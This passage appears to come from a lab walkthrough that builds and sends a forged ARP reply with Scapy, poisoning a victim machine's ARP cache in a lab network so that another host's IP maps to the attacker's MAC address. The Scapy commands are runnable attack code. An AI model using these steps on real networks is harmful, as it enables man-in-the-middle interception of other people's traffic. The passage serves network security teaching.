### Construct the first ARP poisoning packet
**Objective:** First objective is to make the Victim Machine (10.9.0.5) associate User 1 Machine's IP address (10.9.0.6) with the Attacker Machine's MAC address.

14. In your current Scapy terminal, enter:


  ```javascript
arp_to_victim = ARP(
    op=2,
    psrc="10.9.0.6",
    hwsrc="02:42:4b:3d:79:e5",
    pdst="10.9.0.5",
    hwdst="02:42:0a:09:00:05"
)
  ```


15. run:

  ```javascript
arp_to_victim.show()
  ```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img width="1102" height="731" alt="image" src="https://github.com/user-attachments/assets/0f542d2f-d127-4fc5-9adc-9454557eefd8" />


**Result:** The packet falsely tells the Victim Machine: ***User 1 Machine (10.9.0.6) is located at MAC address 02:42:4b:3d:79:e5.***

### Add the Ethernet header
16. Wrap the ARP reply inside an Ethernet frame. In existing Scapy terminal (>>>), enter:


  ```javascript
packet_to_victim = Ether(
    dst="02:42:0a:09:00:05",
    src="02:42:4b:3d:79:e5"
) / arp_to_victim
  ```

17. Run:

  ```javascript
packet_to_victim.show()
  ```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img width="792" height="650" alt="image" src="https://github.com/user-attachments/assets/a63adebd-f236-4894-a21a-30e2b438ca4c" />


**Result:** The ARP portion contains the IP-to-MAC mapping being advertised. The Ethernet header determines where the frame is delivered on the local network.

Here, we're addressing the frame directly to the Victim Machine.

### Send the packet
18. Return to your Attacker Terminal (>>>) and execute:

  ```javascript
sendp(packet_to_victim, iface="br-c84de5716c52", count=1)
  ```
